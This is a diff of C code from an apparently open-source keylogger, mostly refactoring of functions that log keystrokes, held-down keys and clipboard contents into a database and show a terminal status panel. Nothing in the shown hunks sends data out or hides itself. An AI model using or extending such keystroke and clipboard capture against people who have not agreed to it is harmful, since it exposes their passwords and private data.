@@ -60,10 +60,7 @@ void __at_exit(void){
 int keylogger_db_delete(void){
   db_statement_t db_st = NEW_DB_STATEMENT();
 
-  db_st.rc = sqldbal_stmt_prepare(db,
-                                  "DELETE FROM events",
-                                  -1,
-                                  &db_st.stmt);
+  db_st.rc = sqldbal_stmt_prepare(db, "DELETE FROM events", -1, &db_st.stmt);
   EXEC_AND_ASSERT_DB_STATEMENT(db_st);
   return(0);
 }
@@ -211,8 +208,12 @@ int keylogger_insert_db_row(logged_key_event_t *LOGGED_EVENT){
   unsigned long  clipboard_updated_dur = cur_ts - last_clipboard_check_ts;
 
   if (clipboard_updated_dur > check_clipboard_interval_ms) {
-    CLIPBOARD_EVENT = encode_cliboard_event(read_clipboard());
-//    CLIPBOARD_EVENT         = encode_cliboard_event(pbpaste_exec());
+    char *clipboard_content = read_clipboard();
+    if (clipboard_content == NULL) {
+      printf("invalid clipboard content!");
+      exit(1);
+    }
+    CLIPBOARD_EVENT         = encode_clipboard_event(clipboard_content);
     last_clipboard_check_ts = cur_ts;
   }
   if (updated_dur > check_qty_interval_ms) {
@@ -226,15 +227,16 @@ int keylogger_insert_db_row(logged_key_event_t *LOGGED_EVENT){
     last_qty_check_ts = timestamp();
     //focused_t *fp = get_focused_process();
   }
-  if (updated_dur > 5) {
+  if (updated_dur > 0) {
     fprintf(stdout,
             AC_CLS
-            "\n\t  | ts:            |%lu|"
+            "\n\t  | Timestamp:     |%lu|"
             "\n\t  | updated ms:    |" AC_BOLD AC_UNDERLINE "%lu" AC_NOUNDERLINE AC_PLAIN "|"
             "\n\t  | keycode:       |%lu|"
             "\n\t  | action:        |%s|"
             "\n\t  | key:           |%s|"
             "\n\t  | type:          |" AC_BOLD AC_UNDERLINE "%s" AC_NOUNDERLINE AC_PLAIN "|"
+            "\n\t  | # Down Keys:   |%lu: (%s)|"
             "\n\t  | # rows:        |%lu|"
             "\n\t  | table size:    |" AC_INVERSE "%s" AC_NOINVERSE "|"
             "\n\t  | # windows:     |%d|"
@@ -253,6 +255,7 @@ int keylogger_insert_db_row(logged_key_event_t *LOGGED_EVENT){
             LOGGED_EVENT->action,
             LOGGED_EVENT->key_string,
             LOGGED_EVENT->input_type,
+            vector_size(LOGGED_EVENT->downkeys_v), LOGGED_EVENT->downkeys_csv,
             recorded_qty,
             bytes_to_string(table_size_bytes),
             windows_qty,
@@ -297,18 +300,15 @@ int keylogger_insert_db_row(logged_key_event_t *LOGGED_EVENT){
     ASSERT_DB_STATEMENT(db_st);
     db_st.rc = sqldbal_stmt_bind_int64(db_st.stmt, 10, vector_size(pids_v));
     ASSERT_DB_STATEMENT(db_st);
-//    db_st.rc = sqldbal_stmt_bind_int64(db_st.stmt, 7, 123456);
-//  ASSERT_DB_STATEMENT(db_st);
     EXEC_AND_ASSERT_DB_STATEMENT(db_st);
     db_st.rc = sqldbal_last_insert_id(db, "events_id_seq", &db_st.inserted_id);
     ASSERT_DB_STATEMENT(db_st);
     db_st.rc = sqldbal_stmt_close(db_st.stmt);
     ASSERT_DB_STATEMENT(db_st);
-    //log_debug("inserted row #%lu", (size_t)db_st.inserted_id);
     inserted_events_qty++;
   }
   if (DEBUG_LOGGED_EVENTS) {
-    fprintf(stdout,
+    fprintf(stderr,
             AC_RESETALL "last recorded_qty check ts:%lu (%llums ago)" AC_RESETALL
             "\n\t|%lu checks| %lu records|%s Database|"
             "\n\t|pids:	%lu|"
@@ -320,18 +320,6 @@ int keylogger_insert_db_row(logged_key_event_t *LOGGED_EVENT){
             vector_size(pids_v),
             windows_qty
             );
-    /*
-     * ("ts:%lu", LOGGED_EVENT->ts);
-     * ("kc:%lu", LOGGED_EVENT->key_code);
-     * log_debug("ks:%s", LOGGED_EVENT->key_string);
-     * log_debug("type:%s", LOGGED_EVENT->input_type);
-     * log_debug("pids:%lu", vector_size(pids_v));
-     * log_debug("windows_qty:%d", windows_qty);
-     * log_debug("display_qty:%d", display_qty);
-     * log_debug("focused_pid:%d", focused_pid);
-     * log_debug("mouse:%lux%lu", LOGGED_EVENT->mouse_x, LOGGED_EVENT->mouse_y);
-     * log_debug("screen size:x:%d,y:%d,w:%d,h:%d", ss.x, ss.y, ss.w, ss.h);
-     */
   }
   last_ts = cur_ts;
   return(0);
